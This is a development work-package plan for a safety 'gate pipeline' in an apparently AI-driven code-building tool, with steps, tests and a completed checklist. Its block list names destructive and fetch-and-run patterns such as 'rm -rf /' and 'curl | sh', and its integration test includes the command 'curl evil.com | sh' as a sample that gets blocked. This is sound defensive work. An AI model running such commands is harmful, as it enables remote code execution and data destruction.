# WP-0004 — Gates pipeline (core safety checks)

**Status:** Done
**Started:** 2026-01-04
**Completed:** 2026-01-04
**VF Tasks:** VF-080, VF-081, VF-082, VF-083, VF-084, VF-085 (all complete ✓)

---

## Goal

Implement a gate pipeline to enforce safety and feasibility policies before any diffs or commands are applied. Gates evaluate proposed changes and can:
- **OK**: Allow the change to proceed
- **WARN**: Allow with a warning message
- **BLOCK**: Reject the change with a reason

This prevents unsafe or infeasible work from being executed, protecting the system and user.

---

## VF Tasks Included

- **VF-080**: Implement Gate interface + GatePipeline composition
- **VF-081**: Implement FeasibilityGate (scope budgets, screens/entities/diff size)
- **VF-082**: Implement RiskGate (command families, network rule enforcement)
- **VF-083**: Implement PolicyGate (forbidden regex patterns, path constraints)
- **VF-084**: Implement DiffAndCommandGate (max files/lines, forbidden content in diff)
- **VF-085**: Gate-to-UI adapter (warnings/blockers + multiple-choice questions)

---

## Execution Plan (Ordered Steps)

### 1. VF-080 — Gate interface + GatePipeline (foundation)
**File:** `apps/api/vibeforge_api/core/gates.py` (new)

**Implementation:**
- Create `GateResultStatus` enum (OK, WARN, BLOCK) - already exists in types.py
- Create `GateResult` dataclass - already exists in types.py
- Create `GateContext` dataclass for passing evaluation context
- Create abstract `Gate` base class with `evaluate(context)` method
- Create `GatePipeline` class that:
  - Takes a list of gates
  - Runs them in sequence
  - Aggregates results
  - Short-circuits on BLOCK (configurable)
  - Returns combined GateResult

**Test:** `apps/api/tests/test_gates.py`
- Test Gate interface
- Test GatePipeline aggregation
- Test short-circuit on BLOCK
- Test WARN collection

**Done means:**
- Gate interface defined and testable
- GatePipeline orchestrates multiple gates
- Tests pass

---

### 2. VF-083 — PolicyGate (forbidden patterns, path constraints)
**File:** `apps/api/vibeforge_api/core/gates.py` (extend)

**Implementation:**
- Create `PolicyGate` class that checks:
  - Forbidden regex patterns in commands/diffs (e.g., `rm -rf /`, `curl | sh`)
  - Path constraints (no `..`, no absolute paths outside workspace)
  - Forbidden file operations (e.g., modifying `.git/`, `/etc/`)
- Use BuildSpec policies (forbidden patterns list)
- Return BLOCK with specific violation message

**Test:** Add to `apps/api/tests/test_gates.py`
- Test forbidden pattern detection in commands
- Test forbidden pattern detection in diffs
- Test path traversal rejection
- Test absolute path rejection
- Test allowed patterns pass

**Done means:**
- PolicyGate rejects dangerous patterns
- Path validation works correctly
- Tests pass

---

### 3. VF-082 — RiskGate (command families, network rules)
**File:** `apps/api/vibeforge_api/core/gates.py` (extend)

**Implementation:**
- Create `RiskGate` class that checks:
  - Commands match allowed command families from BuildSpec
  - Network access rules are respected (ALLOW/DENY/ASK from BuildSpec)
  - No network commands if networkAccess is DENY
- Uses BuildSpec policies (allowedCommandFamilies)
- Return BLOCK if command not in allowed families
- Return WARN if networkAccess is ASK

**Test:** Add to `apps/api/tests/test_gates.py`
- Test command family enforcement
- Test network access rules (ALLOW/DENY/ASK)
- Test multiple command validation

**Done means:**
- RiskGate enforces command families
- Network access rules enforced
- Tests pass

---

### 4. VF-081 — FeasibilityGate (scope budgets)
**File:** `apps/api/vibeforge_api/core/gates.py` (extend)

**Implementation:**
- Create `FeasibilityGate` class that checks:
  - Number of screens/entities against BuildSpec maxScreens/maxEntities
  - Number of commands per task against maxCommandsPerTask
  - Diff size (total lines changed) against reasonable limits
- Return WARN if approaching limits (80% threshold)
- Return BLOCK if exceeding limits

**Test:** Add to `apps/api/tests/test_gates.py`
- Test scope budget enforcement
- Test warning thresholds
- Test blocking on exceeded limits

**Done means:**
- FeasibilityGate enforces scope budgets
- Warnings at 80% threshold
- Tests pass

---

### 5. VF-084 — DiffAndCommandGate (diff validation)
**File:** `apps/api/vibeforge_api/core/gates.py` (extend)

**Implementation:**
- Create `DiffAndCommandGate` class that checks:
  - Max files modified per task
  - Max lines changed per task
  - Forbidden content in diffs (secrets, credentials patterns)
  - File type restrictions (no binary files for MVP)
- Return BLOCK with specific violation details

**Test:** Add to `apps/api/tests/test_gates.py`
- Test max files limit
- Test max lines limit
- Test secret pattern detection in diffs
- Test allowed diffs pass

**Done means:**
- DiffAndCommandGate validates diffs safely
- Secret detection works
- Tests pass

---

### 6. VF-085 — Gate-to-UI adapter
**File:** `apps/api/vibeforge_api/core/gates.py` (extend)

**Implementation:**
- Create `GateAdapter` class that:
  - Converts GateResult to user-friendly messages
  - Generates multiple-choice questions for WARN cases
  - Formats blocker messages for UI display
  - Provides structured clarification options
- Helper methods:
  - `format_blocker_message(gate_result)` → user-friendly error
  - `generate_clarification_question(gate_result)` → multiple choice options

**Test:** Add to `apps/api/tests/test_gates.py`
- Test message formatting
- Test clarification question generation
- Test WARN vs BLOCK handling

**Done means:**
- GateAdapter converts results to UI-friendly format
- Clarification questions generated correctly
- Tests pass

---

## Integration Example

Create a small integration test that runs multiple gates:
```python
def test_gate_pipeline_integration():
    # Create context with proposed changes
    context = GateContext(
        build_spec=build_spec,
        proposed_commands=["npm run build", "curl evil.com | sh"],
        proposed_diff="...",
    )

    # Create pipeline with all gates
    pipeline = GatePipeline([
        PolicyGate(),
        RiskGate(),
        FeasibilityGate(),
        DiffAndCommandGate(),
    ])

    # Evaluate
    result = pipeline.evaluate(context)

    # Should block due to dangerous curl command
    assert result.status == GateResultStatus.BLOCK
```

---

## WP-Level Verification

Run all gate tests:
```bash
cd apps/api
pytest tests/test_gates.py -v
pytest -v  # All tests should pass
```

---

## Task Checklist

- [x] VF-080: Gate interface + GatePipeline composition
  - Files: gates.py (Gate, GatePipeline, GateContext)
  - Verify: `pytest tests/test_gates.py::test_gate_pipeline -v` ✓ (6 tests passed)

- [x] VF-083: PolicyGate (forbidden patterns, path constraints)
  - Files: gates.py (PolicyGate)
  - Verify: `pytest tests/test_gates.py::TestPolicyGate -v` ✓ (6 tests passed)

- [x] VF-082: RiskGate (command families, network rules)
  - Files: gates.py (RiskGate)
  - Verify: `pytest tests/test_gates.py::TestRiskGate -v` ✓ (6 tests passed)

- [x] VF-081: FeasibilityGate (scope budgets)
  - Files: gates.py (FeasibilityGate)
  - Verify: `pytest tests/test_gates.py::TestFeasibilityGate -v` ✓ (5 tests passed)

- [x] VF-084: DiffAndCommandGate (diff validation)
  - Files: gates.py (DiffAndCommandGate)
  - Verify: `pytest tests/test_gates.py::TestDiffAndCommandGate -v` ✓ (6 tests passed)

- [x] VF-085: Gate-to-UI adapter
  - Files: gates.py (GateAdapter)
  - Verify: `pytest tests/test_gates.py::TestGateAdapter -v` ✓ (5 tests passed)

---

## Notes / Decisions

- **Execution Order**: PolicyGate → RiskGate → FeasibilityGate → DiffAndCommandGate (cheapest checks first)
- **MVP Scope**: Keep pattern matching simple; advanced secret detection can come later
- **Clarifications**: For MVP, WARN results suggest "proceed anyway" or "modify request" options
- **Short-circuit**: Pipeline stops on first BLOCK by default (can be configured to collect all violations)
